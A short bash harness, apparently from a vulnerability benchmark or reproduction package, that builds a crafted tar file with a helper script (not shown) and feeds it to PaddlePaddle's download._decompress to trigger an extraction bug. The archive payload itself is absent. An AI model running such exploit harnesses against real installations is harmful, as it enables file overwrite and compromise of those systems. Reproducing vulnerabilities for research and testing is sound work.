#!/bin/bash

set -e

# switch to the folder containing this script for relative paths
cd "$(dirname "$0")"

echo "Creating exploit tar file..."
python create_exploit.py

echo "Running exploit..."

# copy vulnerable code and use directly
cp ../../../codebase/python/paddle/utils/download.py ./download.py

# httpx is a requirement, else fails
pip install httpx

# now exploit the bug
python -c "import download; download._decompress('exploit.tar')"

echo "Exploit completed"